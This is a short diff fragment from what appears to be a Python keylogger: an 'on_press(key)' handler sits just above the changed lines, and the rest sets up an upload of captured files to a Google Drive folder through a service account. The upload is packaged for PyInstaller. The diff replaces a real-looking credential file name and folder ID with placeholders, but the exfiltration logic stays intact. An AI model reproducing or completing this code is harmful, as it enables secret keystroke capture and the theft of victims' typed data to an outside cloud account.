@@ -46,16 +46,16 @@ def on_press(key):
                 return False
 
 # Google Drive Upload Variables
-SCOPES = ['https://www.googleapis.com/auth/drive']
-SERVICE_ACCOUNT_FILE = 'firstproject-eb079-a747c909d9dc.json'
-FOLDER_ID = '1stAD30hSPxGMXsdpXU0NsltYxoEAMfE2'
+SCOPES = ['GOOGLE DRIVE API HERE']
+SERVICE_ACCOUNT_FILE = 'JSON FILE FROM GOOGLE CLOUD HERE'
+FOLDER_ID = 'GOOGLE DRIVE FOLDER ID HERE'
 
 # Upload a file to Google Drive
 def upload_file(file_path, folder_id):
     if hasattr(sys, '_MEIPASS'):
-        credentials_path = os.path.join(sys._MEIPASS, 'firstproject-eb079-a747c909d9dc.json')
+        credentials_path = os.path.join(sys._MEIPASS, 'JSON FILE FROM GOOGLE CLOUD HERE')
     else:
-        credentials_path = 'firstproject-eb079-a747c909d9dc.json'
+        credentials_path = 'JSON FILE FROM GOOGLE CLOUD HERE'
 
     credentials = service_account.Credentials.from_service_account_file(
         credentials_path, scopes=SCOPES
